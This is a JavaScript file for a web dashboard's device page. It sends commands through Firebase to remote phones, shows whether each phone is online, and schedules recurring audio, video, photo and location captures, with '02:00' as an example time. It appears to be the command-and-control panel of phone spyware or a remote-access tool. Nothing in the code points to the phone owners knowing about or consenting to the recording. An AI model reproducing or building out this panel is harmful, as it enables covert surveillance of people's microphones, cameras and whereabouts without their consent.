// ============================================
// COMMANDS HANDLER — Device Detail Page
// ============================================

document.addEventListener('DOMContentLoaded', () => {
    console.log('[Commands] Loaded');

    // Auth check
    if (!AUTH.isLoggedIn()) {
        window.location.href = 'index.html';
        return;
    }

    // Device key — URL se ya localStorage se
    const params = new URLSearchParams(window.location.search);
    let deviceKey = params.get('device') || localStorage.getItem('selectedDevice');

    if (!deviceKey) {
        alert('Koi device select nahi kiya');
        window.location.href = 'dashboard.html';
        return;
    }

    console.log('[Commands] Device:', deviceKey);

    // ========== ELEMENTS ==========
    const deviceName = document.getElementById('deviceName');
    const deviceStatus = document.getElementById('deviceStatus');
    const deviceKeyEl = document.getElementById('deviceKey');
    const toast = document.getElementById('toast');

    // ========== BACK BUTTON ==========
    document.getElementById('backBtn').addEventListener('click', () => {
        window.location.href = 'dashboard.html';
    });

    document.getElementById('refreshBtn').addEventListener('click', () => {
        location.reload();
    });

    // ========== DEVICE INFO LOAD ==========
    window.db.ref('devices/' + deviceKey).on('value', (snap) => {
        const d = snap.val() || {};
        const info = d.info || {};
        const name = `${info.brand || ''} ${info.model || ''}`.trim() || deviceKey.substring(0, 8);

        deviceName.textContent = '📱 ' + name;
        deviceKeyEl.textContent = deviceKey;

        const isOnline = d.lastSeen && (Date.now() - d.lastSeen < 5 * 60 * 1000);
        deviceStatus.textContent = isOnline ? '🟢 Online' : '🔴 Offline';
        deviceStatus.style.color = isOnline ? 'var(--success)' : 'var(--error)';
    });

    // ========== COMMAND BUTTONS ==========
    document.querySelectorAll('.cmd-btn[data-cmd]').forEach(btn => {
        btn.addEventListener('click', () => handleCommand(btn, btn.dataset.cmd));
    });

    // Custom duration buttons
    document.querySelectorAll('[data-cmd-template]').forEach(btn => {
        btn.addEventListener('click', () => {
            const duration = parseInt(document.getElementById('customDuration').value) || 60;
            const cmd = btn.dataset.cmdTemplate.replace('{n}', duration);
            handleCommand(btn, cmd);
        });
    });

    // ========== SEND COMMAND ==========
    async function handleCommand(btn, cmd) {
        // Confirm dialog agar hai
        if (btn.dataset.confirm) {
            if (!confirm(btn.dataset.confirm)) return;
        }

        try {
            console.log('[Commands] Sending:', cmd);

            // Visual feedback
            btn.disabled = true;
            const originalHTML = btn.innerHTML;
            btn.innerHTML = '<span class="loader"></span>';

            // Firebase mein command bhejo
            await window.db.ref('commands/' + deviceKey).set({
                cmd: cmd,
                status: 'pending',
                sentAt: Date.now()
            });

            // Success
            showToast(`✓ "${cmd}" bheja gaya`, 'success');
            console.log('[Commands] Sent:', cmd);

            // Original state restore
            setTimeout(() => {
                btn.innerHTML = originalHTML;
                btn.disabled = false;
            }, 1200);

        } catch (e) {
            console.error('[Commands] Error:', e);
            showToast('Command fail hua', 'error');
            btn.disabled = false;
        }
    }

    // ========== SCHEDULE ==========
    const addScheduleBtn = document.getElementById('addScheduleBtn');
    const schedulesList = document.getElementById('schedulesList');

    addScheduleBtn.addEventListener('click', async () => {
        const timeStr = document.getElementById('schedTime').value; // "02:00"
        const type = document.getElementById('schedType').value;
        const duration = parseInt(document.getElementById('schedDuration').value) || 60;

        if (!timeStr) {
            showToast('Time select karo', 'error');
            return;
        }

        const [hour, minute] = timeStr.split(':').map(n => parseInt(n));

        try {
            addScheduleBtn.disabled = true;
            addScheduleBtn.textContent = 'Adding...';

            // Firebase mein schedule save karo
            await window.db.ref('schedules/' + deviceKey).push({
                hour: hour,
                minute: minute,
                type: type,
                duration: duration,
                enabled: true,
                createdAt: Date.now()
            });

            showToast('✓ Schedule added', 'success');
            addScheduleBtn.disabled = false;
            addScheduleBtn.textContent = 'Add Schedule';
        } catch (e) {
            console.error('[Schedule] Error:', e);
            showToast('Schedule add fail hua', 'error');
            addScheduleBtn.disabled = false;
            addScheduleBtn.textContent = 'Add Schedule';
        }
    });

    // ========== SCHEDULES LIST ==========
    window.db.ref('schedules/' + deviceKey).on('value', (snap) => {
        const data = snap.val() || {};
        const keys = Object.keys(data);

        if (keys.length === 0) {
            schedulesList.innerHTML = '<p style="color:var(--text-muted);font-size:13px;text-align:center;">Koi schedule nahi</p>';
            return;
        }

        schedulesList.innerHTML = keys.map(key => {
            const s = data[key];
            const time = `${String(s.hour).padStart(2, '0')}:${String(s.minute).padStart(2, '0')}`;
            const typeIcons = {
                audio: '🎤', video: '🎥', snap: '📸', location: '📍'
            };
            const icon = typeIcons[s.type] || '⏰';
            const lastTrigger = s.lastTrigger ? timeAgo(s.lastTrigger) : 'Never';

            return `
                <div class="schedule-item">
                    <div class="schedule-item-left">
                        <span style="font-size:20px;">${icon}</span>
                        <div>
                            <div style="font-weight:600;font-size:13px;">${time} — ${s.type}</div>
                            <div style="font-size:11px;color:var(--text-muted);">
                                ${s.duration}s • Last: ${lastTrigger}
                            </div>
                        </div>
                    </div>
                    <button class="icon-btn-sm" data-del="${key}" title="Delete">🗑️</button>
                </div>
            `;
        }).join('');

        // Delete handlers
        schedulesList.querySelectorAll('[data-del]').forEach(btn => {
            btn.addEventListener('click', async () => {
                if (!confirm('Ye schedule delete karein?')) return;
                await window.db.ref('schedules/' + deviceKey + '/' + btn.dataset.del).remove();
                showToast('Schedule deleted', 'success');
            });
        });
    });

    // ========== HELPERS ==========
    function showToast(message, type = 'info') {
        toast.textContent = message;
        toast.className = 'toast ' + type;
        toast.classList.remove('hidden');

        clearTimeout(window._toastTimeout);
        window._toastTimeout = setTimeout(() => {
            toast.classList.add('hidden');
        }, 2500);
    }

    function timeAgo(timestamp) {
        if (!timestamp) return 'Never';
        const diff = Date.now() - timestamp;
        if (diff < 60_000) return 'Just now';
        if (diff < 3_600_000) return `${Math.floor(diff / 60_000)}m ago`;
        if (diff < 86_400_000) return `${Math.floor(diff / 3_600_000)}h ago`;
        return `${Math.floor(diff / 86_400_000)}d ago`;
    }
});
